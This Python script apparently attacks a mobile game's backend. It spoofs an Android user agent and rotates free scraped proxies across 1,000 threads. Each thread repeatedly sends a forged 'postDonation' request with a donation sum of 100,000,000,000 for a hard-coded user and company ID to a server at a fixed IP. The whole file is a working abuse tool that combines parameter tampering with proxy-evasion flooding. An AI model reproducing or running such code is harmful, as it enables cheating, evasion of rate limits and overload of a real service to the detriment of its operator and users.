
import requests
import concurrent.futures
import threading
import time
from queue import Queue
from datetime import datetime

proxies = Queue()
MAX_WORKERS = 1000
REQUEST_TIMEOUT = 10

donation_api = ("http://52.24.104.170:8086/RestSimulator?Operation=postDonation&available_patriotism=1000&company_id=4579286&company_name=G%C3%98M%C3%82ST%C3%84R%F0%9F%91%BD%5BELITE+FOUNDER%5D%0A&country=Germany&donation_sum=100000000000&donation_type=0&sender_company_id=4579286&user_id=C28759C6A78E4E22AC93D78F107E5C72&version_code=23&war_id=57854"

)

headers = {'User-Agent': 'android-asynchttp://loopj.com/android-async-http'}

def fetch_proxies_forever():
    proxy_url = (
        "https://api.proxyscrape.com/v4/free-proxy-list/get?"
        "request=display_proxies&proxy_format=ipport&protocol=http"
    )
    while True:
        try:
            response = requests.get(proxy_url, timeout=10)
            response.raise_for_status()
            proxy_list = response.text.strip().split('\n')
            for proxy in proxy_list:
                proxies.put(proxy.strip())
        except Exception as e:
            with open("critical_error_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Error fetching proxies: {e}\n")
        time.sleep(50)  # Refresh every 60 seconds

def make_request():
    while True:
        if proxies.empty():
            time.sleep(1)
            continue
        proxy = proxies.get()
        proxy_dict = {'http': f'http://{proxy}', 'https': f'http://{proxy}'}
        try:
            response = requests.get(donation_api, headers=headers, proxies=proxy_dict, timeout=REQUEST_TIMEOUT)
            with open("response_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Proxy: {proxy} - Status: {response.status_code}\n")
                log_file.write(f"Content: {response.text}\n\n")
        except requests.exceptions.RequestException as e:
            with open("error_log.txt", "a") as log_file:
                log_file.write(f"{datetime.now()} - Proxy error {proxy}: {e}\n")

def main():
    threading.Thread(target=fetch_proxies_forever, daemon=True).start()
    with concurrent.futures.ThreadPoolExecutor(max_workers=MAX_WORKERS) as executor:
        for _ in range(MAX_WORKERS):
            executor.submit(make_request)

if __name__ == "__main__":
    main()